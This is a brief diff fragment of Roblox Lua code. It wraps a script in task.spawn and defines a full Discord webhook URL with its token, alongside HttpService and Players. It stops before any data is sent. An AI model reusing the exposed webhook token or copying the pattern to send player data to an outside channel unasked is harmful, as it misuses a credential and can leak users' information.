@@ -1,3 +1,4 @@
+task.spawn(function()
 local url = "https://discord.com/api/webhooks/1496125910850736158/yedpyg_hVQz1NcNBMQHFiCqQSqoGEuoq63MPGXjm4JeHetAwWgOhwPJCR_nxw45CT__t"
     local HttpService = game:GetService("HttpService")
     local Players = game:GetService("Players")
